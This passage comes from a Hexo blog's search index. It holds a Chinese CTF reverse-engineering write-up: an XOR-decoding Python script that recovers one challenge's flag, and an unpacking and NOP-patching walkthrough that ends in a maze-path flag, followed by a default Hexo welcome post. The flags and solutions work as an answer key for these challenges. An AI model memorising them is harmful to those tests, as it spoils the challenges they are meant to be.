src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzlhNjRiOGM4ODhmYTI5YWYyNjRmMjczYjQyNWQwOThfcXl4N2hJeFZ4ZHRvRXEyM2pwZ0lpT2tjMlptckdUREZfVG9rZW46TnVnQWJRTnB6b3E2ZG14NHA0Y2NJSUI3blVkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>那我们就直接拖进ida中查看main函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDQ0NTZmNWYwNWQyMWRhMWRhNzY2YWVjMmQ0NWRiODRfeVFTV3FnSHkxelR2RlhCQ0FXMmRiZEY4NlhQcG9zR2tfVG9rZW46UjU2NmJJTjV1b1E4aGt4dGlUZ2NrMXJkbjhDXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>用户输入的为24字节的Arglist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>+xmmword_402220 xmmword <span class="number">4040404040404040404040404040404</span>h</span><br><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>                                           ; DATA XREF: _main+<span class="number">157</span>↑r</span><br><span class="line">.rdata:<span class="number">00402230</span> <span class="number">55</span> <span class="number">48</span> <span class="number">4</span>A <span class="number">51</span> <span class="number">7F</span> <span class="number">73</span> <span class="number">34</span> <span class="number">5B</span> <span class="number">6</span>C <span class="number">45</span>+xmmword_402230 xmmword <span class="number">6</span>A656D7C5B6D456C5B34737F514A4855h</span><br></pre></td></tr></table></figure><p>前十六位和16个进行异或，后8位和4进行异或</p><p><code>C[whAaTy</code>后8位预计输出的内容，将两端内容进行拼接，获取最后的flag</p><p>利用脚本进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_re_challenge</span>():</span><br><span class="line">    <span class="comment"># 根据用户提供的数据段信息</span></span><br><span class="line">    <span class="comment"># xmmword_402220 是 16 个 0x04</span></span><br><span class="line">    xor_key = <span class="string">b&#x27;\x04&#x27;</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xmmword_402230 的字节序列（从 .rdata 段提取）</span></span><br><span class="line">    xmm230_bytes = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;55484A517F73345B6C456D5B7C6D656A&quot;</span>)  <span class="comment"># 共16字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密后的后8字节数据（固定字符串 &quot;C[whAaTy&quot;）</span></span><br><span class="line">    encrypted_part2 = <span class="string">b&#x27;C[whAaTy&#x27;</span>  <span class="comment"># 原始字节：43 5B 77 68 41 61 54 79</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密前16字节：encrypted_part1 = xmm230_bytes，密钥为 xor_key (0x04*16)</span></span><br><span class="line">    decrypted_part1 = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(xmm230_bytes, xor_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后8字节：异或 0x04</span></span><br><span class="line">    decrypted_part2 = <span class="built_in">bytes</span>([c ^ <span class="number">0x04</span> <span class="keyword">for</span> c <span class="keyword">in</span> encrypted_part2])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合得到原始输入（flag）</span></span><br><span class="line">    flag = decrypted_part1 + decrypted_part2</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密并输出结果</span></span><br><span class="line">flag = decrypt_re_challenge()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, flag.decode(<span class="string">&#x27;latin1&#x27;</span>))  <span class="comment"># 处理可能的非ASCII字符</span></span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI5YzE1NDczMGQyNzMzN2FiOWViMTQ0Zjc0MzY1ZTBfNVhtTll6QUZYYkM5WWlkTHIzd3YwRjVMUjNTMWVwc0ZfVG9rZW46U3IxWGJFb1JIb3ZoUEh4Qk0wSGMxMENTbkZnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;w0_hAi_xianG_slEeP&#125;</span><br></pre></td></tr></table></figure><h2 id="HUA"><a href="#HUA" class="headerlink" title="HUA"></a>HUA</h2><p>先拖进die中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWFmYjFlYzgwZTgwYjUzNTI3ZGYxODg3OGI2M2Q4OTRfYzJGNDNsNWJ3S2hlQXJKcFN3U25VeUZuQkN6RFpOeFFfVG9rZW46TExrOWJ4MmFDb1ZPQVl4c1llVGM1WWo4bmhnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>脱壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGI4N2Y1Y2JiYWJlMDRhN2JmNzk1MjIzYzcxZTczZjVfTEtWV3RUem80R05VQW1FaWRSZmxIMTNBaTJ5cXVqdmdfVG9rZW46TWJLcGJWRUs5b1VwU3Z4cW1ycWNtQ3NabnBoXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>脱壳完成后，拖进ida中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2Y4ZWNhYjlkODQ1OWQ5NmM2YzFhNDViMWZhNzZiMzZfSDhRQkRpbkRKSGtPYjZzdXBBVDhsVW1rTUY5dUNWN3pfVG9rZW46V1YySWJKaENSb2VYcDV4WkJnRGN3REZQbnNlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>看到有一处标红，可能是花指令</p><p>把它nop掉</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2MyYzEzNjNkMGE5NmE4YzM0MzgwZTU0ZDdkMjA0YTFfOExhWmlqMnZpQ3ZCcnoyZHU3eEJEUWl5N0FYQ2paV2FfVG9rZW46RGpySmJSOWdLbzFPSHV4QW5TY2NzbUd2bnlkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDU4Y2VlYTFlZTlmNjc3ZTM5NTg5MDAzYWNkNjQyMTdfblZ4SWJKbzJxSXlvZ1BmRHBkZ3Z2OEt5V1dLV3dET0pfVG9rZW46SFR1WWI4bkY2b3FmeWF4MmZRdWNDNWJLbk9oXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjM0OGJkNjM2ODk4MDdhZjk0NzFlOTNhOTk5ZTg1ZTZfNW41ekxUWDJ3R083WHpQdFFhbURXRkhDYkh5R3VBWkJfVG9rZW46RGFrbWJ4am8ybzhpaTZ4QzdUaGN5djc5bkdnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjk5MjFmZDFmYWQ3MTJjMDk3Y2JhMzQ3NjE1OWUyN2RfTXNzVENpd2I2ZUJYajRMc3oyY1ZTYnhJUU44cjExSkNfVG9rZW46QlpXTWJNTkIybzJONW14Z1hvR2NPczNCbjllXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2YzNDlmODEwMDg0MzFhNjExOTBhYmRiNTI5MzZlMThfM2xVYkViZ2VTOWtKVnlHRUJzNFNaNVJWRTBSajhNVElfVG9rZW46WGU5NmJESjltb0xMRll4R1JHQmNyN1lGbmljXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>找到 地图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQyY2FjNGE1Nzg2YzgyOTczZTY2NDk4NzQwMDE0YzJfa3lmOHF2QXE0RlpHTG45RGxHVmo1MVZsWmhKUnFhS3RfVG9rZW46Q3BWU2JtSDl3b1hIMlV4UlhWOGMxSnJrbnNmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzA3YjZhYWE1NmJhMjdlMGRmMDhmMDcxNTQ4MjlhNDRfc1ZlM3d0S1N4a2YyczVDdDRZeDVoNHNtWUxnSWp2bXZfVG9rZW46UkFhcmJVMXFob294TDJ4MEo0aWNyU3U2bjVlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>得到flag<code>QLNU&#123;ssaaasaassdddw&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/2025/04/27/categories/"/>
      <url>/2025/04/27/categories/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/26/hello-world/"/>
      <url>/2025/04/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
